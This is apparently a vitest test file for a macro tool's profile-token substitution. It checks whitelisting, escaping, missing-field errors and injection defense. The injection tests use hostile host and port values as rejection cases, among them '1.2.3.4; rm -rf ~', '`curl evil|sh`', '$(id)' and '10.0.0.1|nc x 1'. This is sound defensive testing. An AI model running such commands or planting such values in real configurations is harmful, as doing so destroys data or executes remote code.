import { describe, expect, it } from "vitest";
import {
  hasProfileTokens,
  profileTokenLabel,
  profileTokensUsed,
  resolveProfileTokens,
  PROFILE_TOKEN_WHITELIST
} from "../../src/services/profileTokens";
import { scanPlaceholders, substituteMacroVariables } from "../../src/services/macroVariables";
import type { ServerConfig } from "../../src/models/config";

function server(overrides: Partial<ServerConfig> = {}): ServerConfig {
  return {
    id: "srv-1",
    name: "Core Switch",
    host: "10.1.2.3",
    port: 22,
    username: "admin",
    authType: "password",
    isHidden: false,
    ...overrides
  };
}

/** Every outcome the tests assert on is a success — narrows without `as`. */
function resolved(text: string, cfg: ServerConfig): string {
  const outcome = resolveProfileTokens(text, cfg);
  if (!outcome.ok) {
    throw new Error(`expected a resolution, got ${outcome.error.kind} for ${outcome.error.token}`);
  }
  return outcome.text;
}

describe("resolveProfileTokens — substitution", () => {
  it("substitutes every whitelisted token", () => {
    const cfg = server({ ipmiHost: "bmc.example.com", port: 2222 });
    expect(
      resolved("${profile.name} ${profile.host}:${profile.port} ${profile.username} ${profile.ipmiHost}", cfg)
    ).toBe("Core Switch 10.1.2.3:2222 admin bmc.example.com");
  });

  it("leaves text with no tokens untouched", () => {
    expect(resolved("show version\n", server())).toBe("show version\n");
  });

  it("never re-interprets a substituted value as a replacement pattern", () => {
    // `String.replace(re, value)` would expand `$&` / `$'` inside the VALUE and
    // splice surrounding text into the output; array-append cannot.
    const cfg = server({ name: "$& $` $' $1 $$" });
    expect(resolved("[${profile.name}]", cfg)).toBe("[$& $` $' $1 $$]");
  });

  it("substitutes every occurrence of the same token", () => {
    const cfg = server({ ipmiHost: "10.9.9.9" });
    expect(resolved("ping ${profile.ipmiHost}; ssh ${profile.ipmiHost}", cfg)).toBe("ping 10.9.9.9; ssh 10.9.9.9");
  });
});

describe("resolveProfileTokens — escaping", () => {
  it("$${profile.host} produces the literal token, not the value", () => {
    expect(resolved("echo $${profile.host}", server())).toBe("echo ${profile.host}");
  });

  it("an escaped token does not require the field to be set", () => {
    // The docs-style macro `echo $${profile.ipmiHost}` must stay runnable on a
    // server with no BMC — only UNESCAPED uses constrain the run.
    expect(resolved("echo $${profile.ipmiHost}", server())).toBe("echo ${profile.ipmiHost}");
  });

  it("escaped and unescaped uses of the same token coexist", () => {
    const cfg = server({ ipmiHost: "10.9.9.9" });
    expect(resolved("$${profile.ipmiHost} = ${profile.ipmiHost}", cfg)).toBe("${profile.ipmiHost} = 10.9.9.9");
  });
});

describe("resolveProfileTokens — unknown tokens", () => {
  it("passes an unknown token through verbatim and reports it", () => {
    const outcome = resolveProfileTokens("ssh ${profile.keyPath} ${profile.host}", server());
    expect(outcome.ok).toBe(true);
    if (!outcome.ok) return;
    expect(outcome.text).toBe("ssh ${profile.keyPath} 10.1.2.3");
    expect(outcome.unknownTokens).toEqual(["keyPath"]);
  });

  it("reports each unknown token once, in first-appearance order", () => {
    const outcome = resolveProfileTokens("${profile.b} ${profile.a} ${profile.b}", server());
    expect(outcome.ok).toBe(true);
    if (!outcome.ok) return;
    expect(outcome.unknownTokens).toEqual(["b", "a"]);
  });

  it("never exposes a non-whitelisted ServerConfig field", () => {
    const cfg = server({ keyPath: "/home/user/.ssh/id_ed25519", authProfileId: "profile-7" });
    expect(resolved("${profile.keyPath} ${profile.authProfileId} ${profile.id}", cfg)).toBe(
      "${profile.keyPath} ${profile.authProfileId} ${profile.id}"
    );
  });
});

describe("resolveProfileTokens — missing fields", () => {
  it("refuses the run when ipmiHost is not set, naming server and field", () => {
    const outcome = resolveProfileTokens(" ipmitool -H ${profile.ipmiHost} sol activate\n", server());
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("missing");
    expect(outcome.error.token).toBe("ipmiHost");
    expect(outcome.error.serverName).toBe("Core Switch");
    expect(outcome.error.message).toContain("Core Switch");
    expect(outcome.error.message).toContain(profileTokenLabel("ipmiHost"));
    // The two implementations this rules out, both of which would "work":
    // sending the literal token, and sending an empty `-H` argument.
    expect(JSON.stringify(outcome)).not.toContain("ipmitool -H ${profile.ipmiHost}");
    expect(JSON.stringify(outcome)).not.toContain("ipmitool -H  sol");
  });

  it("treats an empty or whitespace-only field as not set", () => {
    expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: "" })).ok).toBe(false);
    expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: "   " })).ok).toBe(false);
  });

  it("trims a padded value rather than substituting the padding", () => {
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "  10.0.0.1  " }))).toBe("-H 10.0.0.1");
  });

  it("treats a non-numeric port as not set instead of substituting \"undefined\"", () => {
    const outcome = resolveProfileTokens("-p ${profile.port}", server({ port: undefined as unknown as number }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.token).toBe("port");
  });
});

describe("resolveProfileTokens — injection defense", () => {
  it("refuses a host carrying shell syntax", () => {
    // Reachable through inventory sync and backup import, and the resolved text
    // of a localTerminal macro is executed on the user's own machine.
    const outcome = resolveProfileTokens("ping ${profile.host}", server({ host: "1.2.3.4; rm -rf ~" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("host");
    expect(JSON.stringify(outcome)).not.toContain("rm -rf");
  });

  it("refuses command substitution and pipes in an ipmiHost", () => {
    for (const bad of ["`curl evil|sh`", "$(id)", "10.0.0.1 && reboot", "10.0.0.1|nc x 1", "a>b"]) {
      const outcome = resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: bad }));
      expect(outcome.ok, `expected refusal for ${bad}`).toBe(false);
    }
  });

  it("accepts ordinary addresses: IPv4, bracketed IPv6, and FQDNs", () => {
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "[::1]" }))).toBe("-H [::1]");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "fe80::1" }))).toBe("-H fe80::1");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "bmc-01.dc1.example.com" }))).toBe("-H bmc-01.dc1.example.com");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "10.0.0.1" }))).toBe("-H 10.0.0.1");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "bmc_01" }))).toBe("-H bmc_01");
  });

  it("requires port to be digits only", () => {
    expect(resolveProfileTokens("-p ${profile.port}", server({ port: "22; id" as unknown as number })).ok).toBe(false);
    expect(resolved("-p ${profile.port}", server({ port: 2222 }))).toBe("-p 2222");
  });

  it("refuses a newline in ANY token — a terminal send executes what follows it", () => {
    for (const token of PROFILE_TOKEN_WHITELIST) {
      if (token === "port") continue;
      const outcome = resolveProfileTokens(`x \${profile.${token}}`, server({ [token]: "ok\nreboot" } as Partial<ServerConfig>));
      expect(outcome.ok, `expected refusal for ${token}`).toBe(false);
    }
  });

  it("still allows a free-form display name — it is a label, not an address", () => {
    expect(resolved("# ${profile.name}", server({ name: "Core Switch (DC1)" }))).toBe("# Core Switch (DC1)");
  });
});

describe("profile tokens vs. declared macro variables", () => {
  it("a declared `host` is still prompted while ${profile.host} resolves from the profile", () => {
    // The precedence guard: the shipped grammar cannot produce a dotted name, so
    // the two placeholders are different tokens and neither shadows the other.
    // An implementation that auto-filled bare `$host` from the profile would
    // stop prompting — and silently change what every existing macro sends.
    const text = "connect $host via ${profile.host}";
    const afterTokens = resolved(text, server());
    expect(afterTokens).toBe("connect $host via 10.1.2.3");

    const scan = scanPlaceholders(afterTokens, ["host"]);
    expect(scan.used).toEqual(["host"]);

    expect(substituteMacroVariables(afterTokens, { host: "typed-by-user" }, ["host"])).toBe(
      "connect typed-by-user via 10.1.2.3"
    );
  });

  it("leaves the existing bare-name grammar alone — $profile.host is not a profile token", () => {
    expect(resolved("$profile.host", server())).toBe("$profile.host");
  });
});

describe("profileTokensUsed / hasProfileTokens", () => {
  it("lists the whitelisted tokens a macro actually uses, unescaped, once each", () => {
    expect(profileTokensUsed("${profile.host} ${profile.host} ${profile.ipmiHost}")).toEqual(["host", "ipmiHost"]);
  });

  it("ignores escaped and unknown tokens", () => {
    expect(profileTokensUsed("$${profile.host} ${profile.nope}")).toEqual([]);
    expect(hasProfileTokens("$${profile.host}")).toBe(false);
    expect(hasProfileTokens("${profile.ipmiHost}")).toBe(true);
    expect(hasProfileTokens("show version\n")).toBe(false);
  });
});
